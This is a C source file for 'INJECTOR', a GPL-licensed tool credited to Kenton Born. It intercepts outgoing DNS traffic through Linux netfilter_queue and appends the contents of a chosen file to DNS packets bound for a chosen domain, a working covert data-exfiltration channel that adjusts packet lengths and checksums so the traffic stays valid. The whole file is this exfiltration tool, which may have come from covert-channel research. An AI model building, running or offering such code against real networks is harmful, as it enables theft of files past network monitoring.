/*
INJECTOR - a program that injects a file into legitimate dns traffic.

Copyright (c) 2010 Kenton Born

Author: Kenton Born
Contact: kenton@kentonborn.com

This program is free software: you can redistribute it and/or modify 
it under the terms of the GNU General Public License as published by 
the Free Software Foundation, either version 3 of the License, or 
(at your option) any later version.

This program is distributed in the hope that it will be useful, 
but WITHOUT ANY WARRANTY; without even the implied warranty of 
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
GNU General Public License for more details.

You should have received a copy of the GNU General Public License 
along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#include "injector.h"


char *data;
char *data_ptr;
unsigned long data_len;

char *domain;
short on_requests = 1; // we want requests

static void
usage(void)
{
    fprintf(stdout, "\n\nDNS Injector usage: injector [options]\nOptions:\n");
    fprintf(stdout, "\t-r - inject responses (default: inject queries)\n");
    fprintf(stdout, "\t-d <domain> - domain to exfiltrate to (required)\n");
    fprintf(stdout, "\t-f <file> - file to exfiltrate (required)\n");
    fprintf(stdout, "\t-h - display usage\n");
    fprintf(stdout, "\n");
    exit(-1);
}

/****************************************************************************
* handle_dns determines whether or not to inject data into the dns packet
* based on the domain, direction of the packet, etc. The function returns 
* the amount of data injected into the packet
* **************************************************************************/
long handle_dns(IP_HEADER *ip_hdr) {
    int append_len = 0;
    int hdr_length = IP_HL(ip_hdr)*4; //IP_HL returns # of 32 bit words
    
    UDP_HEADER *udp_hdr = (UDP_HEADER *)((char*)ip_hdr + hdr_length);
    DNS_HEADER *dns_hdr = (DNS_HEADER *)((char*)ip_hdr + hdr_length + UDP_HDR_LENGTH);

    short ip_len = ntohs(ip_hdr->ip_len);
    short udp_len = ntohs(udp_hdr->length);

    char* dns_start = ((char*)ip_hdr + hdr_length + UDP_HDR_LENGTH);
    char *dns_end = ((char *)udp_hdr) + udp_len;

    char* curr_ptr = dns_start + DNS_RR_START;


    LLIST label_list;
    memset(&label_list, 0, sizeof(label_list));
    parse_labels(dns_start, curr_ptr, &label_list);
    
    DOMAIN_INFO domain_info;
    memset(&domain_info, 0, sizeof(DOMAIN_INFO));
    get_domain_info(&label_list, &domain_info);

    /* Is this a domain we want to exfiltrate to? */
    if(strncmp(domain_info.domain, domain, strlen(domain))) 
        return 0;
    
    if((dns_hdr->qr == 0  && on_requests) || 
          (dns_hdr->qr == 1 && !on_requests)) {
        
        append_len = 512 - udp_len;
        if(append_len > data_len) {
            append_len = data_len;
            printf("sending last packet!\n");
        }
       
        memcpy(dns_end, data_ptr, append_len);
       
        char print_str[append_len+1];
        memset(print_str, 0, append_len+1);
        memcpy(print_str, data_ptr, append_len);
        printf("exfiltrating: %s\n", print_str);
 
        data_ptr = data_ptr + append_len;
        data_len -= append_len;
        printf("3");
    }
    else
        return 0;

    ip_hdr->ip_len = htons(ip_len + append_len);
    udp_hdr->length = htons(udp_len + append_len);

    IpChecksum((struct ip *)ip_hdr);
    UdpChecksum((struct ip *)ip_hdr);

    return append_len;
}

/****************************************************************************
* cb is the callback function passed to netfilter_queue, and is called after
* every packet that is received
* **************************************************************************/
static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data) {
    int ret;
    char *pkt_data;
    char new_pkt[5000];
    int id = 0;
    struct nfqnl_msg_packet_hdr *ph;

    memset(new_pkt, 0, 5000);

    ph = nfq_get_msg_packet_hdr(nfa);
    if(ph) {
        id = ntohl(ph->packet_id);
    }

    ret = nfq_get_payload(nfa, &pkt_data);
    memcpy(new_pkt, pkt_data, ret);

    ///////HANDLE IP PACKET///////
    IP_HEADER *ip_hdr = (IP_HEADER *)new_pkt;

    u_int hlen,version;
    int len;

    len     = ntohs(ip_hdr->ip_len);
    hlen    = IP_HL(ip_hdr); /* header length */
    version = IP_V(ip_hdr);/* ip version */

    /* check version */
    if(version != 4) {
      fprintf(stderr,"Unknown version %d\n",version);
    }

    /* check header length */
    if(hlen < 5 ) {
        fprintf(stderr,"bad-hlen %d\n",hlen);
    }

    //TODO: CHECK FOR FRAGMENTS/TRUNCATED
    long added_len = 0;
    if(data_len > 0) 
        added_len = handle_dns(ip_hdr);

    return nfq_set_verdict(qh, id, NF_ACCEPT, ret + added_len, (unsigned char*)new_pkt);
    //return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

/****************************************************************************
* main function - enough said
* **************************************************************************/
int main(int argc, char **argv) {
    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    int fd;
    int rv;
    char buf[4096] __attribute__ ((aligned));
    
    char *file = NULL;
    FILE *file_ptr;

    int c_opt;
    while((c_opt = getopt(argc, argv, "d:f:r")) > 0)
        switch(c_opt) {
        case 'r':
            on_requests = 0;
            break;
        case 'd':
            domain = optarg;
            break;
        case 'f':
            file = optarg;
            break;
        default:
            usage();
        }

    if(domain == NULL || file == NULL)
        usage();

    if(on_requests)
        printf("Injecting requests\n");
    else
        printf("Injecting responses\n");
    printf("domain: %s\n", domain);
    printf("file: %s\n", file);

    file_ptr = fopen(file, "rb");
    if(file == NULL) {
        printf("Error opening %s: %s (%u)\n", file, strerror(errno), errno);
        return -1;
    }

    /*Find the file length and read it into the buffer */
    fseek(file_ptr, 0L, SEEK_END);  /* Position to end of file */
    data_len = ftell(file_ptr); /* Get file length */
    rewind(file_ptr);

    printf("File length: %lu\n", data_len);

    data = (char*)malloc(data_len+1);
    fread(data, data_len, 1, file_ptr);
    data[data_len] = '\0';
    data_ptr = data;
    printf("file successfully read into buffer!\n\n");

    /*Now set up nf_queue nonsense*/
    h = nfq_open();
    if(!h) {
        fprintf(stderr, "error during nfq_open()\n");
        exit(1);
    }

    if(nfq_unbind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_unbind_pf()\n");
        exit(1);
    }

    if(nfq_bind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_bind_pf()\n");
        exit(1);
    }

    qh = nfq_create_queue(h, 0, &cb, NULL);
    if(!qh) {
        fprintf(stderr, "error during nfq_create_queue()\n");
        exit(1);
    }

    if(nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        fprintf(stderr, "can't set packet_copy mode\n");
        exit(1);
    }

    fd = nfq_fd(h);

    printf("Ready!\n\n");

    while((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
        nfq_handle_packet(h, buf, rv);
    }

    printf("unbinding from queue 0\n");
    nfq_destroy_queue(qh);

#ifdef INSANE
    /* normally, applications SHOULD NOT issue this command, since it 
     * detaches other programs/sockets from AF_INET, too! */
    printf("unbinding from AF_INET\n");
    nfq_unbind_pf(h, AF_INET);
#endif

    nfq_close(h);
    exit(0);
}

